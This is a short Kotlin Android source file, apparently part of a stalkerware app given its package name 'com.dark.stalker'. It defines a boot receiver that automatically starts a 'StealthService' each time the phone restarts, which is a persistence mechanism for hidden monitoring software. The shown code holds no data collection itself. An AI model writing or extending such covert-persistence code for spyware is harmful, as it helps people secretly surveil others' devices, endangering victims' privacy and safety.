package com.dark.stalker

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.intent.action.BOOT_COMPLETED") {
            val serviceIntent = Intent(context, StealthService::class.java)
            context.startService(serviceIntent)
        }
    }
}
